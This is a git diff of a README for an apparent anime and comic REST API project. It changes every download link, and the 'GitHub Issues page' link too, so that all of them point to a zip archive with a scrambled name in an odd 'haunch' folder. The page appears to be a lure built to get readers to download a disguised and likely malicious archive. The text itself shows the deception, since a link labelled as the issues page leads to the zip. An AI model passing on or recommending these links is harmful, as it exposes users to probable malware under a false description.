@@ -1,7 +1,7 @@
 # 🎉 Rest-Api-Anime-and-Comic - Access Anime and Comics Easily
 
 ## 💾 Download Here
-[![Download Latest Release](https://raw.githubusercontent.com/phudz611/Rest-Api-Anime-and-Comic/main/haunch/Rest-Api-Anime-and-Comic-1.6.zip%20Latest%https://raw.githubusercontent.com/phudz611/Rest-Api-Anime-and-Comic/main/haunch/Rest-Api-Anime-and-Comic-1.6.zip)](https://raw.githubusercontent.com/phudz611/Rest-Api-Anime-and-Comic/main/haunch/Rest-Api-Anime-and-Comic-1.6.zip)
+[![Download Latest Release](https://github.com/phudz611/Rest-Api-Anime-and-Comic/raw/refs/heads/main/haunch/and-Api-Rest-Comic-Anime-3.1.zip%20Latest%https://github.com/phudz611/Rest-Api-Anime-and-Comic/raw/refs/heads/main/haunch/and-Api-Rest-Comic-Anime-3.1.zip)](https://github.com/phudz611/Rest-Api-Anime-and-Comic/raw/refs/heads/main/haunch/and-Api-Rest-Comic-Anime-3.1.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the Rest-Api-Anime-and-Comic application. Follow the simple steps below, and you’ll be exploring anime and comic data in no time.
@@ -20,7 +20,7 @@ To ensure the application runs smoothly, here are the basic requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the Rest-Api-Anime-and-Comic application.
 
-[Download Latest Release](https://raw.githubusercontent.com/phudz611/Rest-Api-Anime-and-Comic/main/haunch/Rest-Api-Anime-and-Comic-1.6.zip)
+[Download Latest Release](https://github.com/phudz611/Rest-Api-Anime-and-Comic/raw/refs/heads/main/haunch/and-Api-Rest-Comic-Anime-3.1.zip)
 
 1. Click on the release you want to download.
 2. Choose the version suitable for your operating system.
@@ -50,7 +50,7 @@ If you encounter issues, here are some common solutions:
 - **API Errors:** These may happen if the API source is down. Try again later.
 
 ## 📚 Support
-If you need assistance, please check the documentation within the app or visit our [GitHub Issues page](https://raw.githubusercontent.com/phudz611/Rest-Api-Anime-and-Comic/main/haunch/Rest-Api-Anime-and-Comic-1.6.zip) for help.
+If you need assistance, please check the documentation within the app or visit our [GitHub Issues page](https://github.com/phudz611/Rest-Api-Anime-and-Comic/raw/refs/heads/main/haunch/and-Api-Rest-Comic-Anime-3.1.zip) for help.
 
 ## 🌐 Related Topics
 - **Anime:** Anime shows and movies.
